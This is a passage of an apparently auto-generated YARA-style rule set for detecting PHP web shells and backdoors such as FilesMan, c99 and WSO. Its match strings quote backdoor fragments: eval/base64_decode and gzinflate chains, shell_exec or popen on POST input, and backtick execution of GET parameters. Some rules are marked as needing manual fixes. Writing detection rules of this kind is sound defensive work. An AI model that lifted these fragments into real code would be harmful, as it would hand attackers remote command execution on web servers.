        $trigger = "Q21WeWNtOXlYM0psY0c5eWRHbHVaeUFvTUN"
    condition:
        $trigger and PR01398
}

private rule PR02375 : trigger
{
    strings:
        $ps0 = "FsUzZsynQx%2FFOf5XJyu%2FEhriD%2FZvl47aY3uJZ4juu4V"
    condition:
        $ps0
}

rule php_backdoor_filesman_162 : backdoor
{
    strings:
        $trigger = "base64_decode"
    condition:
        $trigger and PR02375 and PR00029
}

private rule PR02376 : trigger
{
    strings:
        $ps0 = "]=base64_decode(\"RE9DVU1FTlRfUk9PVA==\");$GLOBALS["
    condition:
        $ps0
}

rule php_backdoor_filesman_163 : backdoor
{
    strings:
        $trigger = "['online_viewer'] = true;"
    condition:
        $trigger and PR00042 and PR02376 and PR00046 and PR00251
}

private rule PR02377 : trigger
{
    strings:
        $ps0 = "strlen(trim($"
    condition:
        $ps0
}

private rule PR02378 : trigger
{
    strings:
        $ps0 = "736536345F6465636F64652827"
    condition:
        $ps0
}

rule php_backdoor_filesman_165 : backdoor
{
    strings:
        $trigger = "hexdec(substr($"
    condition:
        $trigger and PR02377 and PR02378 and PR01550 and PR01637
}

rule php_backdoor_filesman_166 : backdoor
{
    strings:
        $trigger = "]) ^ chr(28);return"
    condition:
        $trigger and PR01350
}

private rule PR02379 : trigger
{
    strings:
        $ps0 = "\\x62\\x61\\x73\\x65\\x36\\x34\\x5f\\x64\\x65\\x63\\x6f\\x64\\x65"
    condition:
        $ps0
}

rule php_backdoor_filesman_167 : backdoor
{
    strings:
        $trigger = "RmlsZXNNYW4"
    condition:
        $trigger and PR01350 and PR02379
}

rule php_backdoor_filesman_168 : backdoor
{
    strings:
        $trigger = "B5hVQynW206aSpbiNI8mp3ntONl799jeWjRJSUwkkiUpP"
    condition:
        $trigger and PR00029 and PR00634
}

rule php_backdoor_filesman_170 : backdoor
{
    strings:
        $trigger = "eval(htmlspecialchars_decode(base64_decode(urldecode(base64_decode($"
    condition:
        $trigger
}

private rule PR02380 : trigger
{
    strings:
        $ps0 = ");@eval($"
    condition:
        $ps0
}

private rule PR02381 : trigger
{
    strings:
        $ps0 = "=@urldecode($"
    condition:
        $ps0
}

rule php_backdoor_filesman_171 : backdoor
{
    strings:
        $trigger = "=@strrev($"
    condition:
        $trigger and PR02380 and PR02381
}

// MANUAL FIX NECESSARY
private rule PR02382 : trigger
{
    strings:
        $ps0 = "% $"
    condition:
        $ps0
}

rule php_backdoor_filesman_172 : backdoor
{
    strings:
        $trigger = "] ^ $"
        $php_backdoor_filesman_172_r0 = /\(\$[\w]+\);[\s]*(\$[\w+[\s]*=[\s]*strlen[^;]+;[\s]*){2,}if[^\}]+\}[\s]*for[^\}]+\}[\s]*return[^\(]+\(\$[^\)]+\);[\s]*eval[^;]+\)/
    condition:
        $trigger and PR00029 and PR02382 and PR01422 and $php_backdoor_filesman_172_r0
}

// MANUAL FIX NECESSARY
rule php_backdoor_filesman_173 : backdoor
{
    strings:
        $trigger = "default_action"
        $php_backdoor_filesman_173_r0 = /\$default_action[\s]*=[\s]*['\"\s\.]*F/
    condition:
        $trigger and $php_backdoor_filesman_173_r0
}

rule php_backdoor_filesman_174 : backdoor
{
    strings:
        $trigger = "Pb3njuTclqb3"
    condition:
        $trigger and PR01016 and PR01372
}

rule php_backdoor_filesman_175 : backdoor
{
    strings:
        $trigger = "eNpVjk0LgkAURdcF/gcR17OKNtKmnPJb0yJoEyqamPOpaPjrmwlSe8vz3jv3KnqUYnowLeJE"
    condition:
        $trigger and PR01422 and PR01372
}

// MANUAL FIX NECESSARY
rule php_backdoor_filesman_176 : backdoor
{
    strings:
        $trigger = "eNpVjk0LgkAURdcF"
        $php_backdoor_filesman_176_r0 = /<\?php[\s]*@?eval/
    condition:
        $trigger and PR00029 and $php_backdoor_filesman_176_r0
}

rule php_backdoor_filesman_177 : backdoor
{
    strings:
        $trigger = "7X37e9s2sujP3e"
    condition:
        $trigger and PR02205
}

rule php_backdoor_firesh_001 : backdoor
{
    strings:
        $trigger = "Firesh"
    condition:
        $trigger and PR00265 and PR02163
}

rule php_backdoor_foxauto_001 : backdoor
{
    strings:
        $trigger = "<?php /* FoxAuto */"
    condition:
        $trigger and PR00029
}

private rule PR02383 : trigger
{
    strings:
        $ps0 = "<?php $GLOBALS['_"
    condition:
        $ps0
}

rule php_backdoor_frmtmp_uploader_001 : backdoor
{
    strings:
        $trigger = "frmtmp.php\"); ?>"
    condition:
        $trigger and PR02383
}

private rule PR02384 : trigger
{
    strings:
        $ps0 = "preg_match('#gogo(.*)enen#is', $otvet, $mtchs);"
    condition:
        $ps0
}

rule php_backdoor_frmtmp_uploader_002 : backdoor
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR02384
}

private rule PR02385 : trigger
{
    strings:
        $ps0 = "go(.*)enen"
    condition:
        $ps0
}

rule php_backdoor_frmtmp_uploader_003 : backdoor
{
    strings:
        $trigger = "$ya = base64_decode("
    condition:
        $trigger and PR01401 and PR02385
}

rule php_backdoor_fuckphpshell_001 : backdoor
{
    strings:
        $trigger = "result = shell_exec($_POST['cmd'] . \" 2>&1\""
    condition:
        $trigger
}

rule php_backdoor_gagal_001 : backdoor
{
    strings:
        $trigger = "echo\"<b>gagal\""
    condition:
        $trigger and PR00507
}

rule php_backdoor_gandalf_001 : backdoor
{
    strings:
        $trigger = "strripos(@sha1($shall),"
    condition:
        $trigger and PR00507
}

rule php_backdoor_genericw3_01 : backdoor
{
    strings:
        $trigger = "jsp File browser"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_010 : backdoor
{
    strings:
        $trigger = "NIX REMOTE WEB-SHELL"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_013 : backdoor
{
    strings:
        $trigger = "<title>PhpShell"
    condition:
        $trigger
}

rule php_backdoor_genericw3_015 : backdoor
{
    strings:
        $trigger = "hackru.info"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_016 : backdoor
{
    strings:
        $trigger = "Hmilyld"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_017 : backdoor
{
    strings:
        $trigger = "c99shell"
    condition:
        $trigger
}

rule php_backdoor_genericw3_019 : backdoor
{
    strings:
        $trigger = "ernealizm"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_020 : backdoor
{
    strings:
        $trigger = "C99Shell v"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_021 : backdoor
{
    strings:
        $trigger = "xIXRbE"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_022 : backdoor
{
    strings:
        $trigger = "MyShell"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_023 : backdoor
{
    strings:
        $trigger = "fuckjp"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_027 : backdoor
{
    strings:
        $trigger = "<title>ZoRBaCK Connect</title>"
    condition:
        $trigger
}

rule php_backdoor_genericw3_028 : backdoor
{
    strings:
        $trigger = "hkmjj"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_029 : backdoor
{
    strings:
        $trigger = "<title>ASPX Shell</title>"
    condition:
        $trigger
}

rule php_backdoor_genericw3_030 : backdoor
{
    strings:
        $trigger = "<title>.+- WSO.+</title>"
    condition:
        $trigger
}

rule php_backdoor_genericw3_031 : backdoor
{
    strings:
        $trigger = "hack520"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_032 : backdoor
{
    strings:
        $trigger = "BloodSword"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_034 : backdoor
{
    strings:
        $trigger = "lcxMacros"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_035 : backdoor
{
    strings:
        $trigger = "JFileMan"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_036 : backdoor
{
    strings:
        $trigger = "<title>Knull Shell</title>"
    condition:
        $trigger
}

rule php_backdoor_genericw3_037 : backdoor
{
    strings:
        $trigger = "<title>:: www.h4ckcity.org :: Coded By 2MzRp & LocalMan ::</title>"
    condition:
        $trigger
}

rule php_backdoor_genericw3_038 : backdoor
{
    strings:
        $trigger = "<title>JSP Shell</title>"
    condition:
        $trigger
}

rule php_backdoor_genericw3_039 : backdoor
{
    strings:
        $trigger = "r57shell</title>"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_040 : backdoor
{
    strings:
        $trigger = "jspreverse.html"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_041 : backdoor
{
    strings:
        $trigger = "icesword"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_042 : backdoor
{
    strings:
        $trigger = "<form method=\"POST\" action=\"cfexec.cfm\">"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_043 : backdoor
{
    strings:
        $trigger = "JSP Backdoor Reverse Shell"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_044 : backdoor
{
    strings:
        $trigger = "REMVIEW TOOLS"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_045 : backdoor
{
    strings:
        $trigger = "PHVayv"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_047 : backdoor
{
    strings:
        $trigger = "NetworkFileManagerPHP"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_048 : backdoor
{
    strings:
        $trigger = "<title>Stored Procedure Execute</title>"
    condition:
        $trigger
}

rule php_backdoor_genericw3_049 : backdoor
{
    strings:
        $trigger = "hacker666"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_05 : backdoor
{
    strings:
        $trigger = "JspSpy"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_050 : backdoor
{
    strings:
        $trigger = "JSP Backdoor"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_051 : backdoor
{
    strings:
        $trigger = "h4ntu"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_052 : backdoor
{
    strings:
        $trigger = "<title>SST Sheller !</title>"
    condition:
        $trigger
}

rule php_backdoor_genericw3_053 : backdoor
{
    strings:
        $trigger = "www.hmilyld.cn"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_054 : backdoor
{
    strings:
        $trigger = "heroes1412"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_055 : backdoor
{
    strings:
        $trigger = "safe.yi.org"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_056 : backdoor
{
    strings:
        $trigger = "<title>.+Ani-Shell.+</title>"
    condition:
        $trigger
}

rule php_backdoor_genericw3_057 : backdoor
{
    strings:
        $trigger = "Persiangig"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_059 : backdoor
{
    strings:
        $trigger = "<title>awen asp.net webshell</title>"
    condition:
        $trigger
}

rule php_backdoor_genericw3_06 : backdoor
{
    strings:
        $trigger = "<title>Mini Php Shell"
    condition:
        $trigger
}

rule php_backdoor_genericw3_060 : backdoor
{
    strings:
        $trigger = "404 infiltrate team"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_061 : backdoor
{
    strings:
        $trigger = "pwnshell"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_064 : backdoor
{
    strings:
        $trigger = "PHP Shell"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_065 : backdoor
{
    strings:
        $trigger = "<title>SyRiAn Sh3ll "
    condition:
        $trigger
}

rule php_backdoor_genericw3_066 : backdoor
{
    strings:
        $trigger = "<title>.+NTDaddy.+</title>"
    condition:
        $trigger
}

rule php_backdoor_genericw3_067 : backdoor
{
    strings:
        $trigger = "<title>iTSecTeam</title>"
    condition:
        $trigger
}

rule php_backdoor_genericw3_069 : backdoor
{
    strings:
        $trigger = "<title>PHP-Terminal"
    condition:
        $trigger
}

rule php_backdoor_genericw3_07 : backdoor
{
    strings:
        $trigger = "<title>r57Shell"
    condition:
        $trigger
}

rule php_backdoor_genericw3_074 : backdoor
{
    strings:
        $trigger = "Cod3rZ"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_075 : backdoor
{
    strings:
        $trigger = "execute command: <input type=\"text\" name=\"c\">"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericw3_08 : backdoor
{
    strings:
        $trigger = "Simple CGI backdoor by DK"
    condition:
        $trigger and PR00042
}

rule php_backdoor_genericwebshell_001 : backdoor
{
    strings:
        $trigger = "ion x_shell_exec($c){echo @shell"
    condition:
        $trigger
}

rule php_backdoor_genericwebshell_006 : backdoor
{
    strings:
        $trigger = "IyEvdXNyL2Jpbi9weXRob24NCiMgDQppbXBvcnQgc3lzLG9zLHNvY2tl"
    condition:
        $trigger and PR00013
}

private rule PR02386 : trigger
{
    strings:
        $ps0 = "ID8+PD9waHAgZnVuY3Rpb24gc3RyZGlyKCRzdHIpIHsgcmV0dXJuIHN0cl9yZXBsYWNlKGFycmF5KCdcXCcs"
    condition:
        $ps0
}

rule php_backdoor_genericwebshell_006_02 : backdoor
{
    strings:
        $trigger = "error_reporting"
    condition:
        $trigger and PR02386 and PR00265
}

rule php_backdoor_genericwebshell_007 : backdoor
{
    strings:
        $trigger = "=strrev(\"esab\").\"64_\".strrev(\"edoced\");$_X=$_A('ZXZhbChnemluZmxhdGUoYmFzZTY0X2RlY29kZSgkX1MpKSk7');$trd=strrev(\"taerc\").\"e_f\".strrev(\"noitcnu\")"
    condition:
        $trigger
}

private rule PR02387 : trigger
{
    strings:
        $ps0 = "$_POST[$key] = stripslashes($value);"
    condition:
        $ps0
}

private rule PR02388 : trigger
{
    strings:
        $ps0 = "copy($_FILES"
    condition:
        $ps0
}

rule php_backdoor_genericwebshell_008 : backdoor
{
    strings:
        $trigger = "Upload Gagal"
    condition:
        $trigger and PR02387 and PR02388
}

private rule PR02389 : trigger
{
    strings:
        $ps0 = "\\x29\\x29\\x29\\x3B\",\"\\x2E\");"
    condition:
        $ps0
}

rule php_backdoor_genericwebshell_009 : backdoor
{
    strings:
        $trigger = "preg_replace"
    condition:
        $trigger and PR02389 and PR02325
}

private rule PR02390 : trigger
{
    strings:
        $ps0 = "<input type=\\\"submit\\\" value=\\\"Upl0ad"
    condition:
        $ps0
}

rule php_backdoor_genericwebshell_010 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR01848 and PR02390 and PR01445
}

rule php_backdoor_genericwebshell_011 : backdoor
{
    strings:
        $trigger = "eval(htmlspecialchars_decode(urldecode(base64_decode($"
    condition:
        $trigger and PR01788
}

private rule PR02391 : trigger
{
    strings:
        $ps0 = "@$GLOBALS{$GLOBALS{"
    condition:
        $ps0
}

rule php_backdoor_genericwebshell_012 : backdoor
{
    strings:
        $trigger = "explode('|;|?|,', 'error_reporting"
    condition:
        $trigger and PR00675 and PR01493 and PR02391
}

// MANUAL FIX NECESSARY
private rule PR02392 : trigger
{
    strings:
        $ps0 = "select * from `wp_users`"
    condition:
        $ps0
}

private rule PR02393 : trigger
{
    strings:
        $ps0 = "))}}{\\${exit()}}"
    condition:
        $ps0
}

rule php_backdoor_genericwebshell_013 : backdoor
{
    strings:
        $trigger = "$_POST"
        $php_backdoor_genericwebshell_013_r0 = /\}[\s]*\?>/
    condition:
        $trigger and PR02392 and PR00397 and PR02393 and $php_backdoor_genericwebshell_013_r0
}

rule php_backdoor_generic_009 : backdoor
{
    strings:
        $trigger = "; echo \"CYBERHAND\";"
    condition:
        $trigger
}

rule php_backdoor_generic_010 : backdoor
{
    strings:
        $trigger = "zdaccess','w');fwrite($fd,$_POST['abbr_domain']);fclose($fd);print 'Domain changed!"
    condition:
        $trigger
}

rule php_backdoor_generic_011 : backdoor
{
    strings:
        $trigger = "has_php_suexec\"] = true;}else{@touch"
    condition:
        $trigger
}

rule php_backdoor_generic_013 : backdoor
{
    strings:
        $trigger = "file_put_contents(sys_get_temp_dir() . '/install.log', $what.\"\\n\", FILE_APPEND);"
    condition:
        $trigger
}

rule php_backdoor_generic_014 : backdoor
{
    strings:
        $trigger = "]($_GET[w]):'';"
    condition:
        $trigger
}

rule php_backdoor_generic_016 : backdoor
{
    strings:
        $trigger = "echo \"<kuku>\".$dir.\"</kuku>\";"
    condition:
        $trigger
}

rule php_backdoor_generic_018 : backdoor
{
    strings:
        $trigger = "'] = 'assert';"
    condition:
        $trigger
}

rule php_backdoor_generic_020 : backdoor
{
    strings:
        $trigger = "\"){$fp = popen($_POST[\"code\"], \"r\"); while (!feof($fp)) {echo fgets"
    condition:
        $trigger
}

rule php_backdoor_generic_021 : backdoor
{
    strings:
        $trigger = "$replaced = str_replace($needle, $needle.$gencode, $general_template);"
    condition:
        $trigger
}

private rule PR02394 : trigger
{
    strings:
        $ps0 = "$_GE"
    condition:
        $ps0
}

rule php_backdoor_generic_022 : backdoor
{
    strings:
        $trigger = "bHNle2VjaG8gJ2JlYW46IGh0dHA6Ly8nLiRfU0VSVkVSWydIVFRQX0hPU1QnXS5zdHJfcmVwbGFjZSgkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddLCcnLCRmKTt9ZXhpdDs="
    condition:
        $trigger and PR02394
}

rule php_backdoor_generic_024 : backdoor
{
    strings:
        $trigger = " @preg_replace('/(.*)/e', @$_POST['"
    condition:
        $trigger
}

rule php_backdoor_generic_025 : backdoor
{
    strings:
        $trigger = "return inj($d,'wp-config.php');"
    condition:
        $trigger
}

rule php_backdoor_generic_029 : backdoor
{
    strings:
        $trigger = "=eval(chr(47).chr(42).chr(116).chr(116).chr(42).chr(47).chr(36).chr(122)"
    condition:
        $trigger
}

rule php_backdoor_generic_030 : backdoor
{
    strings:
        $trigger = "preg_replace('//e','e'.'v'.'al($a)','');"
    condition:
        $trigger
}

rule php_backdoor_generic_031 : backdoor
{
    strings:
        $trigger = "$_POST[\"pwd\"]=\"Weak Liver\";"
    condition:
        $trigger
}

rule php_backdoor_generic_032 : backdoor
{
    strings:
        $trigger = "($u($_REQUEST[$i]));exit();}"
    condition:
        $trigger
}

rule php_backdoor_generic_033 : backdoor
{
    strings:
        $trigger = "$_GET['f']($_GET['a'],'lol.php'); die(); }"
    condition:
        $trigger
}

rule php_backdoor_generic_034 : backdoor
{
    strings:
        $trigger = "file_put_contents('options.php', base64_decode($_POST["
    condition:
        $trigger
}

rule php_backdoor_generic_035 : backdoor
{
    strings:
        $trigger = "120\\117\\123\\124\\40\\133\\42\\163\\151\\144\\42\\135\\73\\40\\151\\146\\40\\50\\155\\144\\65\\50"
    condition:
        $trigger and PR01483
}

rule php_backdoor_generic_037 : backdoor
{
    strings:
        $trigger = "if(strstr(base64_decode($e), \"undermomocontrol\") !== false)"
    condition:
        $trigger
}

private rule PR02395 : trigger
{
    strings:
        $ps0 = "header(\"HTTP/1.0 404 Not Found\");exit;"
    condition:
        $ps0
}

rule php_backdoor_generic_039 : backdoor
{
    strings:
        $trigger = "$_F=__FILE__;$_X"
    condition:
        $trigger and PR02395 and PR02163
}

rule php_backdoor_generic_040 : backdoor
{
    strings:
        $trigger = "$run_ioncubetesterplus = create_function('', \"\\x40\".$Keys"
    condition:
        $trigger
}

rule php_backdoor_generic_041 : backdoor
{
    strings:
        $trigger = "$O00OO0=urldecode(\"%6E1%7A%62%2F%6D%615%5C"
    condition:
        $trigger and PR00029
}

private rule PR02396 : trigger
{
    strings:
        $ps0 = "error_reporting(0);header('Content-Type: text/html; charset=utf-8');$"
    condition:
        $ps0
}

rule php_backdoor_generic_041_02 : backdoor
{
    strings:
        $trigger = "$O00OO0=urldecode(\"%6E1%7A%62"
    condition:
        $trigger and PR00029 and PR02396
}

rule php_backdoor_generic_045 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR00026
}

private rule PR02397 : trigger
{
    strings:
        $ps0 = "Shell"
    condition:
        $ps0
}

rule php_backdoor_generic_045_02 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR02397
}

private rule PR02398 : trigger
{
    strings:
        $ps0 = "$admin['pass']"
    condition:
        $ps0
}

rule php_backdoor_generic_045_03 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR02398
}

private rule PR02399 : trigger
{
    strings:
        $ps0 = "= (md5($_POST['pass']));"
    condition:
        $ps0
}

rule php_backdoor_generic_045_04 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR02399
}

rule php_backdoor_generic_045_06 : backdoor
{
    strings:
        $trigger = "]).@$_($_REQUEST["
    condition:
        $trigger
}

rule php_backdoor_generic_045_07 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode(rawurldecode($_"
    condition:
        $trigger
}

private rule PR02400 : trigger
{
    strings:
        $ps0 = "if(isset($_GET[\"rdir\"]) && trim($_GET[\"rdir\"])){"
    condition:
        $ps0
}

private rule PR02401 : trigger
{
    strings:
        $ps0 = "all is ok"
    condition:
        $ps0
}

rule php_backdoor_generic_046 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02400 and PR02401
}

private rule PR02402 : trigger
{
    strings:
        $ps0 = "modx_manager"
    condition:
        $ps0
}

rule php_backdoor_generic_048 : backdoor
{
    strings:
        $trigger = "@eval(@gzuncompress(@str_rot13(@base64_decode("
    condition:
        $trigger and PR02402
}

private rule PR02403 : trigger
{
    strings:
        $ps0 = "$action = (isset($_GET["
    condition:
        $ps0
}

private rule PR02404 : trigger
{
    strings:
        $ps0 = "query_string = $_POST["
    condition:
        $ps0
}

rule php_backdoor_generic_049 : backdoor
{
    strings:
        $trigger = "$orderslist=explode("
    condition:
        $trigger and PR02403 and PR02404 and PR01490
}

private rule PR02405 : trigger
{
    strings:
        $ps0 = "@array_diff_ukey"
    condition:
        $ps0
}

private rule PR02406 : trigger
{
    strings:
        $ps0 = "stripslashes"
    condition:
        $ps0
}

rule php_backdoor_generic_050 : backdoor
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR02405 and PR02406 and PR01479
}

private rule PR02407 : trigger
{
    strings:
        $ps0 = "$txt=gzinflate($txt);"
    condition:
        $ps0
}

private rule PR02408 : trigger
{
    strings:
        $ps0 = "@eval("
    condition:
        $ps0
}

private rule PR02409 : trigger
{
    strings:
        $ps0 = "$key=md5(sha1($"
    condition:
        $ps0
}

rule php_backdoor_generic_051 : backdoor
{
    strings:
        $trigger = "=chr(ord($"
    condition:
        $trigger and PR02407 and PR02408 and PR02409
}

private rule PR02410 : trigger
{
    strings:
        $ps0 = "'));"
    condition:
        $ps0
}

private rule PR02411 : trigger
{
    strings:
        $ps0 = "';$"
    condition:
        $ps0
}

private rule PR02412 : trigger
{
    strings:
        $ps0 = "(@$"
    condition:
        $ps0
}

private rule PR02413 : trigger
{
    strings:
        $ps0 = ";@$"
    condition:
        $ps0
}

private rule PR02414 : trigger
{
    strings:
        $ps0 = "'.$"
    condition:
        $ps0
}

private rule PR02415 : trigger
{
    strings:
        $ps0 = "('ZXZ"
    condition:
        $ps0
}

rule php_backdoor_generic_052 : backdoor
{
    strings:
        $trigger = ").'"
    condition:
        $trigger and PR02410 and PR02411 and PR02412 and PR02413 and PR01411 and PR02414 and PR02415
}

private rule PR02416 : trigger
{
    strings:
        $ps0 = "$color = \"#ddff55\";"
    condition:
        $ps0
}

rule php_backdoor_generic_053 : backdoor
{
    strings:
        $trigger = "$default_use_ajax = true;"
    condition:
        $trigger and PR01421 and PR02416
}

private rule PR02417 : trigger
{
    strings:
        $ps0 = "=@gzinflate($"
    condition:
        $ps0
}

private rule PR02418 : trigger
{
    strings:
        $ps0 = "if(isset($_COOKIE["
    condition:
        $ps0
}

private rule PR02419 : trigger
{
    strings:
        $ps0 = "substr(MD5(strrev($"
    condition:
        $ps0
}

private rule PR02420 : trigger
{
    strings:
        $ps0 = ";unset($"
    condition:
        $ps0
}

rule php_backdoor_generic_054 : backdoor
{
    strings:
        $trigger = "header(\"Status: 404 Not Found\");"
    condition:
        $trigger and PR02417 and PR02418 and PR02419 and PR02420 and PR00732
}

rule php_backdoor_generic_055 : backdoor
{
    strings:
        $trigger = "$data=file_get_contents(\"php://input\");echo`$data`;"
    condition:
        $trigger
}

private rule PR02421 : trigger
{
    strings:
        $ps0 = "if(sha1($p["
    condition:
        $ps0
}

private rule PR02422 : trigger
{
    strings:
        $ps0 = "p=$_POST;if(isset($p["
    condition:
        $ps0
}

rule php_backdoor_generic_056 : backdoor
{
    strings:
        $trigger = "]);die();"
    condition:
        $trigger and PR02421 and PR02422
}

private rule PR02423 : trigger
{
    strings:
        $ps0 = "if ($text($_FILES["
    condition:
        $ps0
}

rule php_backdoor_generic_058 : backdoor
{
    strings:
        $trigger = "md5($_POST["
    condition:
        $trigger and PR02423
}

rule php_backdoor_generic_059 : backdoor
{
    strings:
        $trigger = "<?=`$_GET[cmd"
    condition:
        $trigger
}

private rule PR02424 : trigger
{
    strings:
        $ps0 = "assert(base64_decode($_POST["
    condition:
        $ps0
}

rule php_backdoor_generic_060 : backdoor
{
    strings:
        $trigger = "@ini_set(\"log_errors\",0); @ini_set(\"error_log\",0); if(isset($_POST[\""
    condition:
        $trigger and PR02424
}

rule php_backdoor_generic_061 : backdoor
{
    strings:
        $trigger = "if(isset($_POST['c']))file_put_contents"
    condition:
        $trigger
}

rule php_backdoor_generic_064 : backdoor
{
    strings:
        $trigger = "7P1pe9s4sjAMfz5zXfMfGI2nY48da/WiuO1uat/3PZ3HQ"
    condition:
        $trigger and PR01789
}

private rule PR02425 : trigger
{
    strings:
        $ps0 = "\"riny(\".$strings2(\"base64_decode\");"
    condition:
        $ps0
}

rule php_backdoor_generic_065 : backdoor
{
    strings:
        $trigger = "ASSERT_WARNING"
    condition:
        $trigger and PR02425 and PR01837
}

private rule PR02426 : trigger
{
    strings:
        $ps0 = "@error_reporting(E_ALL);"
    condition:
        $ps0
}

private rule PR02427 : trigger
{
    strings:
        $ps0 = "ASSERT_WARNING"
    condition:
        $ps0
}

rule php_backdoor_generic_065_02 : backdoor
{
    strings:
        $trigger = "riny(\".$strings2"
    condition:
        $trigger and PR02426 and PR02427
}

private rule PR02428 : trigger
{
    strings:
        $ps0 = "else{echo \"<sy>No Results !! .</sy>\";ob_flush();flush();return false;}"
    condition:
        $ps0
}

rule php_backdoor_generic_067 : backdoor
{
    strings:
        $trigger = "str_replace"
    condition:
        $trigger and PR02428
}

private rule PR02429 : trigger
{
    strings:
        $ps0 = "echo handleRequest(file_get_contents('php://input'));"
    condition:
        $ps0
}

rule php_backdoor_generic_069 : backdoor
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR02429 and PR01479
}

private rule PR02430 : trigger
{
    strings:
        $ps0 = "=base64_decode($"
    condition:
        $ps0
}

private rule PR02431 : trigger
{
    strings:
        $ps0 = "=(ord($"
    condition:
        $ps0
}

rule php_backdoor_generic_070 : backdoor
{
    strings:
        $trigger = ",\"\\r\\n\\r\\n\")+"
    condition:
        $trigger and PR01654 and PR02430 and PR02431 and PR00397
}

rule php_backdoor_generic_071 : backdoor
{
    strings:
        $trigger = "eval(base64_decode(\"JEkxSWxJbDFsSTE9ZmlsZShwcmVnX"
    condition:
        $trigger
}

private rule PR02432 : trigger
{
    strings:
        $ps0 = ";unlink($_SERVER['SCRIPT_FILENAME']);?>"
    condition:
        $ps0
}

rule php_backdoor_generic_073 : backdoor
{
    strings:
        $trigger = "=base64_encode(file_get_contents("
    condition:
        $trigger and PR02432 and PR01021
}

rule php_backdoor_generic_074 : backdoor
{
    strings:
        $trigger = "eval(base64_decode('QGFycmF5X2RpZmZfdWtleShAYXJy"
    condition:
        $trigger
}

private rule PR02433 : trigger
{
    strings:
        $ps0 = "JGp3YkdXQVY3NTkxID0gIm9hd203Xyg0eXgpNi5jKmRxaWdud"
    condition:
        $ps0
}

rule php_backdoor_generic_075 : backdoor
{
    strings:
        $trigger = "base64_decode"
    condition:
        $trigger and PR02433 and PR00029
}

// MANUAL FIX NECESSARY
private rule PR02434 : trigger
{
    strings:
        $ps0 = "FALSE !== @$GLOBALS["
    condition:
        $ps0
}

rule php_backdoor_generic_076 : backdoor
{
    strings:
        $trigger = "].$"
        $php_backdoor_generic_076_r0 = /die[\s]*\([\s]*PHP_OS[\s]*\.[\s]*\$[\w]+\[[\d]+\][\s]*\.[\s]*\$/
    condition:
        $trigger and PR02434 and $php_backdoor_generic_076_r0
}

private rule PR02435 : trigger
{
    strings:
        $ps0 = "],$cont);}exit;}if(!$_SERVER{"
    condition:
        $ps0
}

rule php_backdoor_generic_077 : backdoor
{
    strings:
        $trigger = "=$_POST[$_SERVER{"
    condition:
        $trigger and PR01490 and PR02435
}

rule php_backdoor_generic_079 : backdoor
{
    strings:
        $trigger = "eNrdfWtX47iy6Oc5a53/YDy92/F0CHFeQIIDNA3d9AN6gH4CJ+M4Tu"
    condition:
        $trigger and PR00029 and PR01422
}

rule php_backdoor_generic_080 : backdoor
{
    strings:
        $trigger = " <p>Daher.Ps Go"
    condition:
        $trigger and PR01746 and PR01490
}

private rule PR02436 : trigger
{
    strings:
        $ps0 = "$path = $_POST['path'];"
    condition:
        $ps0
}

private rule PR02437 : trigger
{
    strings:
        $ps0 = "file_put_contents($path,"
    condition:
        $ps0
}

rule php_backdoor_generic_081 : backdoor
{
    strings:
        $trigger = "$url = $_POST['url'];"
    condition:
        $trigger and PR02436 and PR02437
}

private rule PR02438 : trigger
{
    strings:
        $ps0 = "$kernel = php_uname();"
    condition:
        $ps0
}

rule php_backdoor_generic_082 : backdoor
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR00013 and PR01021 and PR02438
}

// MANUAL FIX NECESSARY
private rule PR02439 : trigger
{
    strings:
        $ps0 = "error_reporting("
    condition:
        $ps0
}

rule php_backdoor_generic_084 : backdoor
{
    strings:
        $trigger = "$_GET["
